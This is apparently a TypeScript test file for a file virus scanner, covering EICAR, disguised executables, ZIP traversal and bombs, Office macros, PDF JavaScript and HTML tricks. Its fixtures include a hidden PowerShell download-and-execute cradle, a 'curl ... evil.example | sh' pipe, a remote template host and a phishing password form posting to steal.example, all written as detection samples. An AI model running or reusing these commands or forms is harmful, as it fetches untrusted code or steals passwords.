import { describe, expect, it } from 'vitest';
import { zipSync, strToU8 } from 'fflate';
import { scanFile, bytesSource, verdict, RULES, type ScanReport } from '../src/tools/files/lib/scan';
import { RU } from '../src/i18n/ru';

const enc = (s: string) => new TextEncoder().encode(s);
const scan = (name: string, data: Uint8Array | string): Promise<ScanReport> => scanFile(bytesSource(name, typeof data === 'string' ? enc(data) : data));
const ids = (r: ScanReport) => r.findings.map((f) => f.id);
const EICAR = ['X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR', 'STANDARD', 'ANTIVIRUS', 'TEST', 'FILE!$H+H*'].join('-');

/** Minimal PE header: MZ, e_lfanew = 0x80, "PE\0\0". */
function fakeExe(): Uint8Array {
  const b = new Uint8Array(512);
  b.set([0x4d, 0x5a]);
  b[0x3c] = 0x80;
  b.set([0x50, 0x45, 0, 0], 0x80);
  b.set(enc('This program cannot be run in DOS mode.'), 0x4e);
  return b;
}

describe('virus scanner', () => {
  it('passes ordinary files', async () => {
    const r = await scan('notes.txt', 'Hello world.\nJust a normal text file with words like download and shell.\n');
    expect(r.findings).toEqual([]);
    expect(verdict(r.findings)).toBe('clean');
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...new Array(200).fill(7)]);
    expect(verdict((await scan('photo.png', png)).findings)).toBe('clean');
  });

  it('detects the EICAR test file (also inside a ZIP)', async () => {
    expect(ids(await scan('eicar.com.txt', EICAR))).toContain('eicar');
    const z = zipSync({ 'docs/readme.txt': strToU8(EICAR) });
    const r = await scan('archive.zip', z);
    expect(r.findings.find((f) => f.id === 'eicar')?.params?.name).toBe('docs/readme.txt');
    expect(verdict(r.findings)).toBe('danger');
  });

  it('flags programs disguised as documents and double extensions', async () => {
    const r = await scan('invoice.pdf', fakeExe());
    expect(ids(r)).toContain('exe-disguised');
    expect(r.detected).toBe('Windows program (EXE)');
    expect(ids(await scan('invoice.pdf.exe', fakeExe()))).toContain('double-ext');
    expect(ids(await scan('photo‮gpj.exe', fakeExe()))).toContain('bidi');
    const ok = await scan('setup.exe', fakeExe());
    expect(ids(ok)).toEqual(['executable']);
    expect(verdict(ok.findings)).toBe('warn');
  });

  it('inspects ZIP contents: disguised programs, traversal, bombs', async () => {
    const r = await scan('pics.zip', zipSync({ 'cat.jpg': fakeExe(), '../../evil.txt': strToU8('x') }));
    expect(ids(r)).toEqual(expect.arrayContaining(['exe-disguised', 'zip-traversal']));
    // 2 GB of zeros cannot be built in a test; a sparse fake central directory claims it instead.
    const z = zipSync({ 'a.bin': new Uint8Array(1000) });
    const dv = new DataView(z.buffer);
    for (let i = z.length - 22; i >= 0; i--) {
      if (dv.getUint32(i, true) === 0x02014b50) {
        dv.setUint32(i + 24, 0xfffffff0, true);
        break;
      }
    }
    expect(ids(await scan('bomb.zip', z))).toContain('zip-bomb');
  });

  it('finds Office macros and remote templates', async () => {
    const docm = zipSync({
      '[Content_Types].xml': strToU8('<Types/>'),
      'word/document.xml': strToU8('<w:document/>'),
      'word/vbaProject.bin': new Uint8Array(10),
      'word/_rels/settings.xml.rels': strToU8('<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>'),
    });
    const r = await scan('report.docx', docm);
    expect(r.detected).toBe('Word document');
    expect(ids(r)).toEqual(expect.arrayContaining(['macros', 'remote-template']));
    expect(r.findings.find((f) => f.id === 'remote-template')?.params?.host).toBe('evil.example');
  });

  it('finds PDF JavaScript, including hex-obfuscated names', async () => {
    const r = await scan('a.pdf', '%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n%%EOF');
    expect(ids(r)).toContain('pdf-auto-js');
    const o = await scan('b.pdf', '%PDF-1.7\n1 0 obj << /S /J#61vaScript /J#53 (x) >> endobj\n%%EOF');
    expect(ids(o)).toEqual(expect.arrayContaining(['pdf-obfuscated', 'pdf-js']));
    const plain = await scan('c.pdf', '%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n%%EOF');
    expect(plain.findings).toEqual([]);
  });

  it('recognises dropper scripts and HTML tricks', async () => {
    const ps = await scan('run.bat', 'powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://x/a.ps1\')"');
    expect(verdict(ps.findings)).toBe('danger');
    expect(ids(ps)).toEqual(expect.arrayContaining(['script', 'commands-danger']));
    const sh = await scan('install.txt', 'curl -fsSL http://evil.example/x | sh');
    expect(ids(sh)).toContain('commands-danger');
    const svg = await scan('logo.svg', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect/></svg>');
    expect(ids(svg)).toContain('svg-script');
    const phish = await scan('login.html', '<html><form action="https://steal.example/p"><input type="password" name="p"></form></html>');
    expect(phish.findings.find((f) => f.id === 'html-password')?.params?.host).toBe('steal.example');
    const b64exe = await scan('data.txt', 'payload=TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFt');
    expect(ids(b64exe)).toContain('embedded-pe');
  });

  it('every rule has a Russian translation', () => {
    for (const r of Object.values(RULES)) {
      expect(RU[r.title], r.title).toBeTruthy();
      expect(RU[r.detail], r.detail).toBeTruthy();
    }
  });
});
